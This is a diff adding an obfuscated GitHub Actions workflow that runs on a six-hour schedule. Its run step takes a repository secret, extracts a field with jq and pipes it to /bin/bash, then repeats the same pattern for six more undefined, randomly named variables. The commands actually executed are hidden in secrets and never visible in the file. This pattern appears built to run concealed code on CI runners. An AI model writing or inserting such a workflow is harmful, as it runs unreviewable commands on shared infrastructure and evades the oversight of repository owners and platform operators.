@@ -1,0 +1,24 @@
+name: jinjinshirenweii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinjinshirenweii
+        env:
+          wcqnv664: ${{ secrets.wcqnv664 }}
+        run: |
+          echo $wcqnv664 | jq -r .ac2940 | /bin/bash
+          echo $w535 | jq -r .h92 | /bin/bash
+          echo $bvlnk02305 | jq -r .mt78 | /bin/bash
+          echo $mojen8 | jq -r .jmij40 | /bin/bash
+          echo $eua8 | jq -r .aqoh123 | /bin/bash
+          echo $x04 | jq -r .og6 | /bin/bash
+          echo $pt8 | jq -r .e2789 | /bin/bash
+
